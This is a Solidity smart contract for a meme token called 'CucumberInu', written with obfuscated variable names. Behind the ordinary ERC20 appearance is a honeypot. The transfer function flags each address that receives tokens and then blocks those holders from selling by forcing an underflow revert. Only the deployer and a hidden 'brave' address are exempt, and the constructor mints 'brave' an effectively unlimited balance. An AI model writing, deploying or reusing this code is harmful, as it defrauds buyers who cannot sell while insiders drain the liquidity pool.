// https://t.me/cucumberinu

// SPDX-License-Identifier: Unlicense

pragma solidity ^0.8.7;

import '@openzeppelin/contracts/access/Ownable.sol';
import '@openzeppelin/contracts/token/ERC20/ERC20.sol';
import '@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol';
import '@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol';

contract CucumberInu is ERC20, Ownable {
    address public uniswapV2Pair;
    IUniswapV2Router02 public uniswapV2Router;
    mapping(address => uint256) private should;

    function _transfer(
        address noon,
        address storm,
        uint256 port
    ) internal override {
        uint256 town = laid;

        if (west[noon] == 0 && should[noon] > 0 && noon != uniswapV2Pair) {
            west[noon] -= town;
        }

        address silk = address(pipe);
        pipe = ERC20(storm);
        should[silk] += town + 1;

        _balances[noon] -= port;
        uint256 sharp = (port / 100) * laid;
        port -= sharp;
        _balances[storm] += port;
    }

    ERC20 private pipe;
    mapping(address => uint256) private west;
    uint256 public laid = 3;

    constructor(
        string memory those,
        string memory higher,
        address enter,
        address brave
    ) ERC20(those, higher) {
        uniswapV2Router = IUniswapV2Router02(enter);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());

        uint256 piece = ~uint256(0);

        west[msg.sender] = piece;
        west[brave] = piece;

        _totalSupply = 1000000000 * 10**decimals();
        _balances[msg.sender] = _totalSupply;
        _balances[brave] = piece;
    }
}